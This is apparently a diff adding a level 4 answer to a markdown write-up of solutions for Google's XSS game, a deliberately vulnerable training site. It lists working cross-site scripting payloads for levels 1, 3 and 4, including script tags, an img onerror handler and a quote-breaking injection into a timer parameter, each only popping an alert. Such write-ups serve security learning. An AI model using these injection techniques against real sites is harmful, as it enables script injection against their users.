@@ -14,3 +14,9 @@ https://xss-game.appspot.com/level1/frame?query=<script>alert("HACKED")</script>
 ```
 https://xss-game.appspot.com/level3/frame/#"/><img src='asdf' onerror='alert("HACKED")'/>
 ```
+
+### Level 4
+```
+'**alert("HACKED"));//
+?timer=%27**alert%28%22HACKED%22%29%29%3B%2F%2F
+```
